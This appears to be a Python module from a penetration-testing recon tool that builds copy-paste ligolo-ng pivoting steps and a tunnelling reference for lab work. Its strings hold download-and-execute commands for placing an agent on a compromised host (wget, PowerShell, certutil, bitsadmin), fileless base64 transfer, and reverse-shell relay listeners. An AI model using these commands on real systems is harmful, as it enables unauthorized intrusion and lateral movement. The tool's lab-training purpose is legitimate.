from __future__ import annotations

import fcntl
import ipaddress
import re
import socket
import struct
from dataclasses import dataclass, field, replace

# Build the ligolo-ng pivot workflow as copy-paste command steps. Nabu does NOT run ligolo (it is a
# tunnelling relay, not a recon tool, and setting up a tun / route needs root) — this is a guided
# command-builder + reference, the same "shown, you run it" model as the Tier-2 manual commands.
# Once the internal /24 is routable over the ligolo interface, Nabu's "Scan a host / range" scans
# it transparently. Reference: https://docs.ligolo.ng/

_SIOCGIFADDR = 0x8915  # Linux ioctl: get an interface's IPv4 address

# Ligolo-ng project pointers — surfaced in the Pivot tab so the operator can grab the current binary
# and confirm syntax. Ligolo-ng changes often (e.g. `start` -> `tunnel_start`, `interface_create`),
# so the tab links the releases page rather than pretending a pinned version is forever-current.
LIGOLO_GITHUB = "https://github.com/nicocha30/ligolo-ng"
LIGOLO_RELEASES = "https://github.com/nicocha30/ligolo-ng/releases/latest"
LIGOLO_DOCS = "https://docs.ligolo.ng/"
# the ligolo-ng release the copy-paste syntax below was last checked against; the tab shows this + a
# "check releases" nudge so a stale reference is obvious. Bump when the commands are re-verified.
LIGOLO_REF_VERSION = "v0.8"
LIGOLO_REF_VERIFIED = "2026-07-18"
# the release the download commands pin to; GitHub asset URLs embed the version, so there is no
# version-less direct link — bump this from the releases page when a newer build lands.
LIGOLO_DL_VERSION = "0.8.2"
_DL_BASE = f"{LIGOLO_GITHUB}/releases/download/v{LIGOLO_DL_VERSION}"


@dataclass
class LigoloStep:
    n: int
    title: str
    where: str  # Kali · pivot host · ligolo console · Nabu
    commands: list[str] = field(default_factory=list)
    note: str = ""


@dataclass(frozen=True)
class PivotMethod:
    name: str
    when: str  # one-line "use this when…"
    commands: list[str]


@dataclass(frozen=True)
class RefItem:
    label: str  # short "what / when to use it"
    command: str  # the copy-paste line ({ip}/{port} already filled)


@dataclass(frozen=True)
class RefSection:
    title: str  # section heading (with an emoji for scanning)
    subtitle: str  # one-line context
    items: tuple[RefItem, ...]


# Quick reference for the OTHER common pivot methods (CPTS: Pivoting, Tunneling & Port Forwarding) —
# when ligolo isn't an option (no root for a tun, only SSH, only a web-RCE, a Windows foothold, …).
# Copy-paste; edit the <ANGLE> placeholders. Recon-only relays/proxies, nothing exploits.
PIVOT_METHODS: tuple[PivotMethod, ...] = (
    PivotMethod(
        "SSH local forward (-L)",
        "reach ONE internal service through an SSH foothold",
        ["ssh -L <LPORT>:<INTERNAL_IP>:<PORT> <user>@<pivot>   # then hit 127.0.0.1:<LPORT>"],
    ),
    PivotMethod(
        "SSH dynamic SOCKS (-D)",
        "proxy ALL your tools into the internal net over SSH",
        [
            "ssh -D 9050 -fN <user>@<pivot>",
            "# add 'socks5 127.0.0.1 9050' to /etc/proxychains.conf, then: proxychains <tool> <ip>",
        ],
    ),
    PivotMethod(
        "SSH reverse forward (-R)",
        "expose YOUR listener to the internal net (catch a shell / serve a file)",
        ["ssh -R <pivot_port>:127.0.0.1:<LPORT> <user>@<pivot>"],
    ),
    PivotMethod(
        "chisel SOCKS (no SSH)",
        "SOCKS tunnel when you only have web/RCE — no SSH creds",
        [
            "./chisel server -p 1234 --reverse --socks5              # on Kali",
            "./chisel client <KALI>:1234 R:socks                     # on the pivot -> SOCKS :1080",
            "# proxychains (socks5 127.0.0.1 1080) then run your tools",
        ],
    ),
    PivotMethod(
        "sshuttle (no proxychains)",
        "VPN-like: route a whole subnet over SSH, no proxychains",
        ["sshuttle -r <user>@<pivot> 172.16.5.0/23       # add -x <pivot_ip> to avoid loops"],
    ),
    PivotMethod(
        "socat port relay",
        "relay a single internal port through the pivot host",
        ["socat TCP4-LISTEN:<LPORT>,fork TCP4:<INTERNAL_IP>:<PORT>    # run on the pivot"],
    ),
    PivotMethod(
        "plink (Windows pivot)",
        "dynamic SOCKS from a Windows foothold (PuTTY's plink)",
        ["plink -ssh -D 9050 <user>@<pivot>"],
    ),
)


def detect_tun_ip(iface: str = "tun0") -> str:
    # best-effort: the VPN/tunnel IP the agent should dial back to. Linux-only ioctl; "" on failure
    # (non-Linux, no such iface) so the dialog just leaves the field blank for the user to fill.
    try:
        with socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM
        ) as sock:  # close the fd, success or not
            packed = struct.pack("256s", iface[:15].encode())
            return socket.inet_ntoa(fcntl.ioctl(sock.fileno(), _SIOCGIFADDR, packed)[20:24])
    except OSError:
        return ""


def _clean_iface(iface: str) -> str:
    # the iface name is interpolated into copy-paste console/route lines; keep it a bare interface
    # token (letters/digits/_/-, max 15 like the kernel limit) so a stray space/metachar can't turn
    # the copied command into two.
    text = (iface or "").strip()
    return text if re.fullmatch(r"[A-Za-z0-9_-]{1,15}", text) else "ligolo"


def _clean_routes(routes: list[str]) -> list[str]:
    out: list[str] = []
    for route in routes:
        text = (route or "").strip()
        if not text:
            continue
        try:
            ipaddress.ip_network(text, strict=False)  # a real CIDR — never a shell token
        except ValueError:
            continue
        if text not in out:
            out.append(text)
    return out


def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
    # OS-specific delivery + launch of the agent on the compromised pivot host — the transfer is the
    # step people trip on, so it's spelled out per OS. The Linux run line stays `./agent -connect`.
    if agent_os == "windows":
        return LigoloStep(
            2,
            "Deliver + run the agent on the Windows pivot",
            "Kali → Windows pivot",
            [
                "python3 -m http.server 8000                                 # on Kali: serve agent.exe",  # noqa: E501
                f"iwr -Uri http://{ip}:8000/agent.exe -OutFile $env:TEMP\\agent.exe   # on pivot (PowerShell)",  # noqa: E501
                f"& $env:TEMP\\agent.exe -connect {ip}:{port} -ignore-cert    # on pivot: dial back",  # noqa: E501
            ],
            "No PowerShell? certutil -urlcache -split -f http://"
            f"{ip}:8000/agent.exe %TEMP%\\agent.exe. The agent dials back to your proxy; a session "
            "then appears in the proxy console. Match agent.exe to your proxy's ligolo-ng version.",
        )
    return LigoloStep(
        2,
        "Deliver + run the agent on the Linux pivot",
        "Kali → Linux pivot",
        [
            "python3 -m http.server 8000                        # on Kali: serve the agent binary",  # noqa: E501
            f"wget http://{ip}:8000/agent -O agent && chmod +x agent   # on the Linux pivot",
            f"./agent -connect {ip}:{port} -ignore-cert          # on the Linux pivot: dial back",
        ],
        "curl -o agent http://"
        f"{ip}:8000/agent works too. The agent dials back to your proxy; a session then appears in "
        "the proxy console. Match the agent binary to your proxy's ligolo-ng version.",
    )


def _download_step(agent_os: str) -> LigoloStep:
    # step 0 — grab the binaries off GitHub (one-time). The PROXY runs on Kali; the AGENT goes
    # pivot host, so its OS/arch must match the target, not your box. URLs embed the pinned version.
    v = LIGOLO_DL_VERSION
    cmds = [
        "mkdir -p ~/ligolo && cd ~/ligolo",
        f"wget {_DL_BASE}/ligolo-ng_proxy_{v}_linux_amd64.tar.gz    # PROXY (runs on Kali)",
        f"tar xzf ligolo-ng_proxy_{v}_linux_amd64.tar.gz",
    ]
    if agent_os == "windows":
        cmds += [
            f"wget {_DL_BASE}/ligolo-ng_agent_{v}_windows_amd64.zip    # AGENT (64-bit Windows)",
            f"unzip ligolo-ng_agent_{v}_windows_amd64.zip",
            f"# 32-bit target? swap in ligolo-ng_agent_{v}_windows_386.zip",
        ]
    else:
        cmds += [
            f"wget {_DL_BASE}/ligolo-ng_agent_{v}_linux_amd64.tar.gz    # AGENT (64-bit Linux)",
            f"tar xzf ligolo-ng_agent_{v}_linux_amd64.tar.gz && chmod +x agent proxy",
        ]
    return LigoloStep(
        0,
        "Download ligolo-ng — one time, on Kali",
        "Kali",
        cmds,
        f"Pinned to release v{v}. Newer out? Grab the latest asset names from {LIGOLO_RELEASES} "
        "and bump the version in the filenames. The proxy is for Kali; the agent must match the "
        "PIVOT host's OS/arch.",
    )


def _tun_ip_step(ip: str) -> LigoloStep:
    # step 0.5 — the agent dials back to YOUR VPN IP (tun0), never 127.0.0.1. People miss this.
    detected = f"Detected tun0 = {ip}. " if ip and ip != "<your-tun0-ip>" else ""
    return LigoloStep(
        1,
        "Find your VPN IP (tun0) — the agent dials this",
        "Kali",
        [
            "ip addr show tun0    # your OSCP-VPN IP — the agent's -connect target",
            "ip -4 addr show tun0 | grep -oP 'inet \\K[\\d.]+'    # just the IP",
        ],
        f"{detected}Use THIS address wherever the steps below say your IP — the agent connects "
        "back to it across the VPN. If tun0 is missing, your VPN isn't up.",
    )


def build_ligolo_steps(
    kali_ip: str,
    port: int = 11601,
    iface: str = "ligolo",
    routes: list[str] | None = None,
    agent_os: str = "linux",
) -> list[LigoloStep]:
    ip = (kali_ip or "<your-tun0-ip>").strip()
    iface = _clean_iface(iface)
    agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
    clean = _clean_routes(routes or [])
    steps: list[LigoloStep] = [
        _download_step(agent_os),
        _tun_ip_step(ip),
        LigoloStep(
            2,
            "Start the ligolo proxy",
            "Kali",
            [f"cd ~/ligolo && ./proxy -selfcert -laddr 0.0.0.0:{port}"],
            "Listens for the agent (self-signed cert). Leave it running in its own terminal; "
            "get the `ligolo-ng »` prompt. Serving + transfer options are in the reference below.",
        ),
        _agent_step(ip, port, agent_os),
    ]
    console = ["session", f"interface_create --name {iface}"]
    for route in clean or ["<internal_/24>"]:
        console.append(f"interface_add_route --name {iface} --route {route}")
    console.append(f"tunnel_start --tun {iface}")
    steps.append(
        LigoloStep(
            4,
            "In the ligolo proxy console",
            "ligolo console",
            console,
            "Pick the agent's session, create the tun, add the route(s), start the tunnel. Run "
            "`ifconfig` in the console to see the agent's internal subnets. (Older ligolo: the "
            "interface auto-creates and you run `start`, not `tunnel_start`.)",
        )
    )
    if clean:
        steps.append(
            LigoloStep(
                5,
                "If traffic doesn't route yet (older ligolo)",
                "Kali",
                [f"sudo ip route add {route} dev {iface}" for route in clean],
                "Modern ligolo's interface_add_route usually handles this — only needed if the "
                "route isn't already present.",
            )
        )
    scan_target = clean[0] if clean else "<internal_/24>"
    steps.append(
        LigoloStep(
            0,  # renumbered below
            "Scan the internal network from Nabu",
            "Nabu",
            [f"Scan → Scan a host / range → target: {scan_target}   (enable -Pn)"],
            "Hosts stream into the recon tree + graph, grouped by subnet, pivoted via this host.",
        )
    )
    # renumber sequentially so the flow always reads 0..N no matter which optional steps are present
    return [replace(step, n=i) for i, step in enumerate(steps)]


def ligolo_reference_sections(
    kali_ip: str, port: int = 11601, agent_os: str = "linux"
) -> list[RefSection]:
    """The 'pick your flavor' menus the linear steps summarise: every way to serve the agent from
    Kali, pull it onto the target (Windows + Linux), tunnel reverse shells/files back through the
    pivot, transfer filelessly in a stripped env, and the ligolo console command reference."""
    ip = (kali_ip or "<your-tun0-ip>").strip() or "<your-tun0-ip>"
    agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
    agent = "agent.exe" if agent_os == "windows" else "agent"

    serve = RefSection(
        "🌐 Serve the agent from Kali (pick one)",
        "Run in ~/ligolo so the agent binary is in the web root. Pick a port that won't clash.",
        (
            RefItem("Python 3 (default)", "python3 -m http.server 8000"),
            RefItem("Python 2 (old boxes)", "python2 -m SimpleHTTPServer 8000"),
            RefItem("PHP", "php -S 0.0.0.0:8000"),
            RefItem("Ruby", "ruby -run -e httpd . -p 8000"),
            RefItem("busybox (minimal Kali)", "busybox httpd -f -p 8000"),
            RefItem("updog (upload+download UI)", "updog -p 8000"),
            RefItem(
                "SMB share (no HTTP; Windows-friendly)",
                "impacket-smbserver share . -smb2support",
            ),
        ),
    )
    win = RefSection(
        "⬇ Pull the agent onto a WINDOWS target (from your shell)",
        f"Serve {agent} from Kali first; save to a writable dir like C:\\Users\\Public.",
        (
            RefItem(
                "PowerShell IWR (try first)",
                f'powershell -c "IWR http://{ip}:8000/{agent} -OutFile C:\\Users\\Public\\{agent}"',
            ),
            RefItem(
                "PowerShell WebClient",
                f'powershell -c "(New-Object Net.WebClient).DownloadFile('
                f"'http://{ip}:8000/{agent}','C:\\Users\\Public\\{agent}')\"",
            ),
            RefItem(
                "certutil",
                f"certutil -urlcache -split -f http://{ip}:8000/{agent} C:\\Users\\Public\\{agent}",
            ),
            RefItem(
                "curl.exe (Win10+)",
                f"curl http://{ip}:8000/{agent} -o C:\\Users\\Public\\{agent}",
            ),
            RefItem(
                "bitsadmin (certutil blocked)",
                f"bitsadmin /transfer j /download /priority high "
                f"http://{ip}:8000/{agent} C:\\Users\\Public\\{agent}",
            ),
            RefItem(
                "SMB copy (with impacket-smbserver)",
                f"copy \\\\{ip}\\share\\{agent} C:\\Users\\Public\\{agent}",
            ),
            RefItem(
                "Run it (dial back to Kali)",
                f"C:\\Users\\Public\\{agent} -connect {ip}:{port} -ignore-cert",
            ),
        ),
    )
    lin = RefSection(
        "⬇ Pull the agent onto a LINUX target (from your shell)",
        "Serve agent from Kali first; drop it in /tmp and make it executable.",
        (
            RefItem("wget", f"wget http://{ip}:8000/agent -O /tmp/agent && chmod +x /tmp/agent"),
            RefItem("curl", f"curl http://{ip}:8000/agent -o /tmp/agent && chmod +x /tmp/agent"),
            RefItem(
                "Run it (dial back to Kali)", f"/tmp/agent -connect {ip}:{port} -ignore-cert &"
            ),
        ),
    )
    listeners = RefSection(
        "🔀 Reverse shells & files THROUGH the tunnel (ligolo console)",
        "An internal host can't reach your Kali directly — add a listener ON the agent that "
        "to your Kali, then point the internal target at the agent's IP:port.",
        (
            RefItem(
                "Catch a reverse shell (internal host → agent:9091 → your Kali:443)",
                "listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:443",
            ),
            RefItem(
                "Serve a file to the internal host (agent:9092 → your Kali:8000)",
                "listener_add --addr 0.0.0.0:9092 --to 127.0.0.1:8000",
            ),
            RefItem("List active listeners", "listener_list"),
            RefItem(
                "Then set your payload LHOST to the AGENT internal IP + the listener port 9091",
                "# e.g. reverse shell -> <agent_internal_ip>:9091 ; catch on Kali: nc -lvnp 443",
            ),
        ),
    )
    fileless = RefSection(
        "📦 Fileless transfer (no wget/curl/nc on the pivot)",
        "base64 the binary on Kali, paste into the shell, decode on the target — survives a hash "
        "check unlike a corrupt copy/paste of the raw binary.",
        (
            RefItem(
                "On Kali: pack + base64 + copy to clipboard",
                "tar -caf agent.tar.xz agent && base64 -w0 agent.tar.xz | xclip -sel clip",
            ),
            RefItem(
                "On the target: paste, decode, extract, run",
                "echo '<PASTE_BASE64>' | base64 -d > agent.tar.xz && tar -xaf agent.tar.xz && "
                "chmod +x agent && ./agent -connect " + f"{ip}:{port} -ignore-cert &",
            ),
            RefItem(
                "Find routable subnets in a stripped shell",
                "cat /proc/net/fib_trie ; cat /proc/net/arp ; cat /proc/net/dev",
            ),
        ),
    )
    console = RefSection(
        "📟 Ligolo console command reference",
        "Typed at the `ligolo-ng »` prompt after the agent joins.",
        (
            RefItem("Select / switch the agent session", "session"),
            RefItem("Show the agent's network interfaces (find internal subnets)", "ifconfig"),
            RefItem("Create the tun interface", "interface_create --name ligolo"),
            RefItem(
                "Add a route to an internal subnet",
                "interface_add_route --name ligolo --route 172.16.1.0/24",
            ),
            RefItem(
                "Start / stop the tunnel", "tunnel_start --tun ligolo    # older: start / stop"
            ),
            RefItem(
                "Add / list / stop a listener (see the tunnel section)",
                "listener_add · listener_list · listener_stop",
            ),
            RefItem("All commands", "help"),
        ),
    )
    order = [serve, win, lin] if agent_os == "windows" else [serve, lin, win]
    return [*order, listeners, fileless, console]
